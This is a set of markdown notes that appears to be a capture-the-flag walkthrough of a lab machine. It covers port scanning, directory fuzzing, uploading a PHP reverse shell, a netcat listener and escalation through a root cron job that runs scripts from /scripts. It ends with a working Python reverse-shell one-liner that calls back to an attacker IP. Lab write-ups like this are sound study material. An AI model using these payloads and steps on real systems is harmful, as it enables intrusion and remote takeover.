# nmap

```bash
> nmap -Pn --min-rate 4000 -p- 10.10.10.68
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-29 14:46 +0700
Nmap scan report for 10.10.10.68
Host is up (0.17s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
```

```bash
> nmap -Pn -p80 -sCV 10.10.10.68
Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-29 14:51 +0700
Nmap scan report for 10.10.10.68
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

# dirbuster

#ffuf 
```bash
> ffuf -u 'http://10.10.10.68/FUZZ' -w ~/seclists/Discovery/Web-Content/common.txt -ic -c
```
![[Pasted image 20250829145451.png]]

#gobuster 
```bash
gobuster dir -u http://10.10.10.68/ -w ~/seclists/Discovery/Web-Content/common.txt
```
![[Pasted image 20250829145613.png]]

![[Pasted image 20250829145707.png]]

![[Pasted image 20250829145804.png]]

# Uploads php-reverse-shell

```bash
> python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

# Setup Listener

```bash
> rlwrap nc -nvlp 4444
Connection from 10.10.10.68:60900
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 01:02:27 up 20 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

# LinEnum

```bash

[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

```

# psypy

```bash
2025/08/29 01:09:22 CMD: UID=0     PID=7      |
2025/08/29 01:09:22 CMD: UID=0     PID=5      |
2025/08/29 01:09:22 CMD: UID=0     PID=3      |
2025/08/29 01:09:22 CMD: UID=0     PID=2      |
2025/08/29 01:09:22 CMD: UID=0     PID=1      | /sbin/init noprompt
2025/08/29 01:10:01 CMD: UID=0     PID=1638   | python test.py
2025/08/29 01:10:01 CMD: UID=0     PID=1637   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
2025/08/29 01:10:01 CMD: UID=0     PID=1636   | /usr/sbin/CRON -f
```

# python reverse-shell

#python #reverse-shell
```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > reverse-shell.py
```
